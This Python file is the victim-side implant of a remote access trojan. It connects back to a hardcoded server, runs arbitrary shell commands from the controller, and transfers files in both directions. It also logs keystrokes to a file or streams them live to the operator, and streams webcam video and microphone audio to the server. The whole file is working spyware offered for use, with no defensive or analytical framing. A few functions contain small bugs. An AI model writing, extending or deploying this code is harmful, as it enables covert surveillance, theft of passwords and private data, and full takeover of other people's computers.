# Import necessary Python modules
import socket  # For network communication
import time  # For adding delays
import subprocess  # For running shell commands
import json  # For encoding and decoding data in JSON format
import os  # For interacting with the operating system
from pynput.keyboard import Listener  # For capturing keyboard events
import re
import pyaudio
import threading
import wave
import pickle
import cv2
import struct

# --- Configuration ---
SERVER_IP = '192.168.1.13' # Change this to your server's IP
CONTROL_PORT = 5555
VIDEO_PORT = 9999
AUDIO_PORT = 9998
# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)     # Convert data to JSON format
    s.send(jsondata.encode())       # Send the encoded data over the network

# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks and decode
            return json.loads(data)  # Parse the received JSON data
        except ValueError:
            continue

# Function to establish a connection to a remote host
def connection():
    while True:
        time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
        try:
            # Connect to a remote host with IP '192.168.1.39' and port 5555
            s.connect((SERVER_IP, CONTROL_PORT))
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            s.close()
            break
        except:
            # If a connection error occurs, retry the connection
            connection()

# Function to upload a file to the remote host
def upload_file(file_name):
    f = open(file_name, 'rb')       # Open the specified file in binary read mode
    s.send(f.read())                # Read and send the file's contents over the network

# Function to download a file from the remote host
def download_file(file_name):
    f = open(file_name, 'wb')       # Open a file for binary write mode
    s.settimeout(1)                 # Set a timeout for receiving data
    chunk = s.recv(1024)            # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)              # Write the received data to the file
        try:
            chunk = s.recv(1024)    # Receive the next chunk
        except socket.timeout as e:
            break
    s.settimeout(None)              # Reset the timeout setting
    f.close()                       # Close the file when done


def start_keylogging(filename):
    global keylogger_listener  # Use a global variable to manage the keylogger listener

    def write_to_file(key):
        with open(filename, 'a') as f:
            letter = str(key)
            letter = letter.replace("'", "")
            letter = letter.replace("Key.space", " ")
            letter = letter.replace("Key.backspace", " [BACKSPACE] ")
            letter = letter.replace("Key.enter", "\n[ENTER]\n")
            letter = letter.replace("Key.tab", "\n[TAB]\n")
            letter = letter.replace("Key.shift", "\n[SHIFT]\n")
            letter = letter.replace("Key.ctrl_l", "\n[CTRL]\n")
            letter = letter.replace("Key.ctrl_r", "\n[CTRL]\n")
            letter = letter.replace("Key.alt_l", "\n[ALT]\n")
            letter = letter.replace("Key.alt_r", "\n[ALT]\n")
            letter = letter.replace("Key.Caps_Lock", "")
            letter = letter.replace("Key.tab", "\n[TAB]\n")

            f.write(letter)

    keylogger_listener = Listener(on_press=write_to_file)   # Create a listener for key events
    keylogger_listener.start()                              # Start the listener to capture key events
    print(f'[+] Keylogging started: {filename}')

    # this comment section is for uploading the keylog file periodically (not yet implemented)


def stop_keylogging():
    global keylogger_listener, keylogging_filename              # Use the global variable to stop the listener
    filename = keylogging_filename

    keylogger_listener.stop()

    upload_file(filename)                                       # Upload the keylog file to the remote host
    os.remove(filename)                                         # Remove the keylog file from the local system
    print(f'[+] Keylogging stopped and {filename} uploaded.')
    keylogging_filename = None


def keylogging_live():
    global keylogger_listener, keylogging_filename, livekeylogging_status

    def send_live_keylog(key):
        reliable_send(str(key))

    def write_livekeylog_to_file(key,filename):
        with open(filename, 'a') as f:
            letter = str(key)
            letter = letter.replace("'", "")
            letter = letter.replace("Key.space", " ")
            letter = letter.replace("Key.backspace", " [BACKSPACE] ")
            letter = letter.replace("Key.enter", "\n[ENTER]\n")
            letter = letter.replace("Key.tab", "\n[TAB]\n")
            letter = letter.replace("Key.shift", "\n[SHIFT]\n")
            letter = letter.replace("Key.ctrl_l", "\n[CTRL]\n")
            letter = letter.replace("Key.ctrl_r", "\n[CTRL]\n")
            letter = letter.replace("Key.alt_l", "\n[ALT]\n")
            letter = letter.replace("Key.alt_r", "\n[ALT]\n")
            letter = letter.replace("Key.Caps_Lock", "")
            letter = letter.replace("Key.tab", "\n[TAB]\n")

            f.write(letter)

    def on_press_functions(key):
        global keylogging_filename

        send_live_keylog(key)
        if keylogging_filename != None:
            write_livekeylog_to_file(key, keylogging_filename)

    keylogger_listener = Listener(on_press=on_press_functions)
    keylogger_listener.start()

    stop_listener = threading.Thread(target=listen_for_livekeylogging_stop, daemon=False)
    stop_listener.start()

    print(f'[+] Live keylogging started')

    while livekeylogging_status:
        pass


def listen_for_livekeylogging_stop():
    global livekeylogging_status, keylogger_listener, keylogging_filename

    while livekeylogging_status:
        try:
            command = reliable_recv()
            if command[:20] == 'keylogging_live_stop':
                keylogger_listener.stop()
                print("[+] Stopping live keylogging...")
                livekeylogging_status = False
                if keylogging_filename != None:
                    try:
                        upload_file(keylogging_filename)
                        print(f"[+] Successfully upload the previous live keylogging session file as {keylogging_filename}")
                    except:
                        print(f"[-] Fail to upload the previous live keylogging session file")

                    time.sleep(5)
                    reliable_send("end of keylogging")
                    os.remove(keylogging_filename)
                    keylogging_filename = None
                    keylogger_listener = None
                    break
                    
                reliable_send("end of keylogging")
                keylogger_listener = None
                break
        except:
            continue

# --- Streaming Functions (to be run in threads) ---
def start_video_stream():
    global video_stream_active
    video_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        video_socket.connect((SERVER_IP, VIDEO_PORT))
    except ConnectionRefusedError:
        print("[-] Video server connection refused.")
        video_stream_active = False
        return

    cap = cv2.VideoCapture(0)
    print("[*] Video streaming started...")
    while video_stream_active:
        ret, frame = cap.read()
        if not ret: break
        frame_data = pickle.dumps(frame)
        message_size = struct.pack("L", len(frame_data))
        try:
            video_socket.sendall(message_size + frame_data)
        except (ConnectionResetError, BrokenPipeError):
            break
    
    print("[*] Video streaming stopped.")
    cap.release()
    video_socket.close()
    video_stream_active = False

def start_audio_stream():
    global audio_stream_active
    audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        audio_socket.connect((SERVER_IP, AUDIO_PORT))
    except ConnectionRefusedError:
        print("[-] Audio server connection refused.")
        audio_stream_active = False
        return

    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    
    print("[*] Audio streaming started...")
    while audio_stream_active:
        try:
            data = stream.read(1024)
            audio_socket.sendall(data)
        except (ConnectionResetError, BrokenPipeError, IOError):
            break

    print("[*] Audio streaming stopped.")
    stream.stop_stream()
    stream.close()
    p.terminate()
    audio_socket.close()
    audio_stream_active = False

# Function to listen for a command to stop the live audio stream
# def listen_for_audio_stop():
#     global liveaudio_status, p, stream, audio_sock

#     while liveaudio_status:
#         try:
#             command = reliable_recv()
#             if command[:14] == 'liveaudio_stop':
#                 liveaudio_status = False
#                 print("[+] Stopping live audio stream...")
#                 break
#         except:
#             continue


# def write_audio_to_file():
#     global liveaudio_status, p, stream, audio_sock, audio_filename
#     filename = audio_filename

#     frames = []

#     while liveaudio_status:
#         data = stream.read(1024)
#         frames.append(data)

#     with wave.open(filename, 'wb') as wf:
#         wf.setnchannels(1)
#         wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
#         wf.setframerate(44100)
#         wf.writeframes(b''.join(frames))

#     upload_file(filename)
#     os.remove(filename)
#     audio_filename = None
#     print(f"[+] Audio stream saved to {filename} and uploaded.")


# def liveaudio_start():
#     global liveaudio_status, p, stream, audio_sock, audio_filename

#     p = pyaudio.PyAudio()
#     stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
#     audio_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#     print("[+] Streaming mic...")

#     # Start background thread to listen for stop command
#     stop_listener = threading.Thread(target=listen_for_audio_stop, daemon=True)
#     stop_listener.start()

#     if audio_filename != None:
#         audiofile_writer = threading.Thread(target=write_audio_to_file, daemon=False)
#         audiofile_writer.start()

#     while liveaudio_status:
#         data = stream.read(1024)
#         audio_sock.sendto(data, ('192.168.1.39', 7777))

#     stream.stop_stream()
#     stream.close()
#     p.terminate()
#     audio_sock.close()
#     p, stream, audio_sock = None, None, None
#     print("[+] Audio stream closed.")


def shell():
    global keylogger_status, keylogging_filename, liveaudio_status, audio_filename, livekeylogging_status
    print("you have been hacked, be careful!")

    while True:
        # Receive a command from the remote host
        command = reliable_recv()
        if command == 'quit':
            break

        elif command == 'clear':
            pass

        elif command[:3] == 'cd ':
            os.chdir(command[3:])

        elif command[:8] == 'download':
            upload_file(command[9:])

        elif command[:6] == 'upload':
            download_file(command[7:])

        elif command[:16] == 'keylogging_start':
            filename = re.sub(r'[\\/:*?"<>|]', '', command[17:]).replace(' ', '')  # clean the filename to avoid invalid characters

            if not keylogger_status:
                keylogging_filename = filename if (len(command) > 17 and filename != "") else 'keylog.txt' # Default filename if not specified
                start_keylogging(keylogging_filename)
                keylogger_status = True
            else:
                pass

        elif command[:15] == 'keylogging_stop':
            if keylogger_status:
                stop_keylogging()
                keylogger_status = False
            else:
                pass

        # elif command[:15] == 'liveaudio_start':
        #     if not liveaudio_status:
        #         filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')

        #         if len(command) > 16:
        #             audio_filename = filename if (filename != "") else 'liveaudio.wav'

        #         liveaudio_status = True
        #         liveaudio_start()
        #     else:
        #         pass

        elif command[:15] == 'keylogging_live':
            if not livekeylogging_status:
                filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')

                if len(command) > 16:
                    keylogging_filename = filename if (filename != "") else 'keylog.txt'

                livekeylogging_status = True
                keylogging_live()
            else:
                pass
        
        elif command == 'stream_start':
            if not video_stream_active:
                video_stream_active = True
                threading.Thread(target=start_video_stream, daemon=True).start()
            if not audio_stream_active:
                audio_stream_active = True
                threading.Thread(target=start_audio_stream, daemon=True).start()
            reliable_send(s, "[+] Stream threads initiated.")
        elif command == 'stream_stop':
            video_stream_active = False
            audio_stream_active = False
            reliable_send(s, "[-] Stopping stream threads.")

        else:
            # For other commands, execute them using subprocess
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
            result = result.decode()  # Decode the output to a string
            # Send the command execution result back to the remote host
            reliable_send(result)


# p, stream, audio_sock = None, None, None  # Initialize PyAudio and stream variables to None

keylogger_status, liveaudio_status, livekeylogging_status = False, False, False

# audio_filename, keylogging_filename = None, None # Default filename for keylogging and live-audio

keylogger_listener = None  # Initialize the keylogger listener variable

# Create a socket object for communication over IPv4 and TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start the connection process by calling the connection() function
connection()